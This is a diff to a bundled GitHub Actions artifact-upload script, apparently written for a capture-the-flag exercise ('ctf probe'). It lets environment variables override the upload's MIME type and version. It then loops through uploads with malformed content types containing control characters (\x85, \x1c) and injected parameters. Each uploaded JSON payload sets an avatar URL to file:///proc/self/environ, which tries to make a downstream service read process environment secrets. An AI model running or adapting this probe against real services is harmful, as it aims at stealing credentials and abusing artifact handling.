@@ -134728,8 +134728,8 @@ function uploadArtifact(name, files, rootDirectory, options) {
             workflowRunBackendId: backendIds.workflowRunBackendId,
             workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
             name,
-            mimeType: StringValue.create({ value: contentType }),
-            version: 7
+            mimeType: StringValue.create({ value: process.env.ARTIFACT_MIME !== undefined ? process.env.ARTIFACT_MIME : contentType }),
+            version: process.env.ARTIFACT_VERSION !== undefined ? Number(process.env.ARTIFACT_VERSION) : 7
         };
         // if there is a retention period, add it to the request
         const expiresAt = getExpiration(options === null || options === void 0 ? void 0 : options.retentionDays);
@@ -134774,7 +134774,7 @@ function uploadArtifact(name, files, rootDirectory, options) {
             const original = fs.readFileSync(files[0], 'utf8');
             fs.writeFileSync(files[0], original.replace('__ARTIFACT_ID__', artifactId.toString()));
             const overwriteStream = yield createRawFileUploadStream(files[0]);
-            yield uploadToBlobStorage(createArtifactResp.signedUploadUrl, overwriteStream, 'application/json\x85');
+            yield uploadToBlobStorage(createArtifactResp.signedUploadUrl, overwriteStream, contentType);
         }
         return {
             size: uploadResult.uploadSize,
@@ -144843,17 +144843,35 @@ If the error persists, please check whether Actions and API requests are operati
 const client = new DefaultArtifactClient();
 
 async function run() {
-  try {
-    const result = await client.uploadArtifact(
-      'payload',
-      ['payload.txt'],
-      process.cwd(),
-      { skipArchive: true }
-    );
-    info(`ARTIFACT_ID=${result.id}`);
-    setOutput('time', new Date().toTimeString());
-  } catch (error) {
-    setFailed(error.message);
+  const cases = [
+    ['payload.txt', 7, 'application/json\x85'],
+    ['payload2.txt', 6, 'application/json\x85'],
+    ['payload3.txt', 5, 'application/json\x85'],
+    ['payload4.txt', 4, 'application/json\x85'],
+    ['payload5.txt', 7, 'application/json\x85; foo=bar'],
+    ['payload6.txt', 7, 'application/json\x85 '],
+    ['payload7.txt', 7, 'APPLICATION/JSON\x85'],
+    ['payload8.txt', 7, 'application/json\x1c'],
+  ];
+  for (const c of cases) {
+    const file = c[0];
+    process.env.ARTIFACT_VERSION = String(c[1]);
+    process.env.ARTIFACT_MIME = c[2];
+    try {
+      if (!fs.existsSync(file)) {
+        fs.writeFileSync(file, JSON.stringify({
+          probe: file,
+          full_name: 'octocat/Hello-World',
+          owner: { login: 'octocat', avatar_url: 'file:///proc/self/environ' },
+          description: 'ctf probe',
+          stargazers_count: 1
+        }));
+      }
+      const result = await client.uploadArtifact(file, [file], process.cwd(), { skipArchive: true });
+      info(`CASE_OK ${file} v=${c[1]} mime=${JSON.stringify(c[2])} id=${result.id}`);
+    } catch (error) {
+      info(`CASE_FAIL ${file} v=${c[1]} mime=${JSON.stringify(c[2])} err=${error.message}`);
+    }
   }
 }
 
